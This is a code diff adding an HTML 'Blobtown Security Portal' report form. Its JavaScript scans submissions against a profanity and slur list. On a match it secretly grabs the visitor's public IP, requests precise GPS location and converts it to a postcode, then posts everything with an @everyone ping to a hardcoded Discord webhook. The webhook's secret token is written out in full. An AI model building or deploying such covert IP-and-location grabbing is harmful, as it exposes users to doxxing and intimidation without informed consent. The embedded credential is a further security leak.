@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blobtown Security Portal</title>
+    <style>
+        :root { --bt-yellow: #FFD700; --bt-dark: #121212; }
+        body { 
+            margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), 
+                        url('https://api.screenshotmachine.com/api/v1/storage/679d1917f694e8001ba90076');
+            background-size: cover; background-position: center; background-attachment: fixed; color: white;
+        }
+        .container { 
+            background: rgba(18, 18, 18, 0.95); width: 90%; max-width: 400px; padding: 30px; 
+            border-radius: 25px; border: 4px solid var(--bt-yellow); text-align: center;
+        }
+        h1 { color: var(--bt-yellow); text-transform: uppercase; letter-spacing: 2px; text-shadow: 2px 2px #000; margin-top: 0; }
+        label { display: block; text-align: left; margin-bottom: 5px; color: var(--bt-yellow); font-weight: bold; font-size: 0.8rem; }
+        input, textarea { 
+            width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #444; 
+            background: #000; color: white; box-sizing: border-box; font-size: 16px; outline: none;
+        }
+        button { 
+            width: 100%; padding: 15px; background: var(--bt-yellow); color: #000; border: none; 
+            border-radius: 50px; font-weight: 900; cursor: pointer; font-size: 1rem;
+        }
+        #status { margin-top: 15px; font-weight: bold; font-size: 0.9rem; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>REPORT HUB</h1>
+        <label>USERNAME</label>
+        <input type="text" id="u" placeholder="Your name...">
+        <label>ISSUE DETAILS</label>
+        <textarea id="i" rows="3" placeholder="What happened?"></textarea>
+        <label>SUGGESTED FIX</label>
+        <textarea id="s" rows="3" placeholder="The solution..."></textarea>
+        <button onclick="checkAndSend()">TRANSMIT REPORT</button>
+        <p id="status"></p>
+    </div>
+
+    <script>
+        const BLACKLIST = ["fuck", "shit", "ass", "bitch", "cunt", "nigger", "faggot", "dick", "pussy", "whore", "slut", "bastard", "retard", "kys", "motherfucker", "cock", "tit", "anal", "rape", "porn", "clit", "twat"];
+
+        async function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) resolve("GPS Not Supported");
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    try {
+                        // Reverse Geocoding to get the actual Postcode
+                        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                        const data = await res.json();
+                        resolve(data.address.postcode || `Lat: ${lat}, Lon: ${lon}`);
+                    } catch {
+                        resolve(`Lat: ${lat}, Lon: ${lon}`);
+                    }
+                }, () => resolve("Permission Denied"));
+            });
+        }
+
+        async function checkAndSend() {
+            const hook = "https://discord.com/api/webhooks/1467137149873819710/oDpNM0_05l4BLYpA6yri4jQ_mB14fvJF5wkOOsMozD4KNM17kBXFmb189GWvxr2-r_kb";
+            const u = document.getElementById('u').value;
+            const i = document.getElementById('i').value;
+            const s = document.getElementById('s').value;
+            const stat = document.getElementById('status');
+
+            const allText = (u + i + s).toLowerCase();
+            const isBad = BLACKLIST.some(word => allText.includes(word));
+
+            stat.innerText = "⏳ SCANNING...";
+
+            let reportData = {
+                username: "Blobtown Security",
+                embeds: [{
+                    title: isBad ? "🚨 ALERT: PROFANITY LOGGED" : "🏙️ New Blobtown Report",
+                    color: isBad ? 15548997 : 16765184,
+                    fields: [
+                        { name: "Sender", value: u },
+                        { name: "Log", value: i },
+                        { name: "Suggestion", value: s }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            if (isBad) {
+                stat.innerText = "⚠️ SECURITY VIOLATION: GRABBING DATA...";
+                // Grab IP
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    reportData.embeds[0].fields.push({ name: "IP", value: ipData.ip });
+                } catch {}
+
+                // Grab Postcode/GPS
+                const location = await getPreciseLocation();
+                reportData.embeds[0].fields.push({ name: "POSTCODE / GPS", value: location });
+                reportData.content = "@everyone **SYSTEM ALERT: OFFENSIVE CONTENT DETECTED.**";
+            }
+
+            try {
+                await fetch(hook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(reportData)
+                });
+                stat.innerText = isBad ? "❌ ACCESS BLOCKED. DATA LOGGED." : "✅ TRANSMISSION COMPLETE.";
+                stat.style.color = isBad ? "red" : "#44ff44";
+            } catch {
+                stat.innerText = "❌ CONNECTION ERROR.";
+            }
+        }
+    </script>
+</body>
+</html>
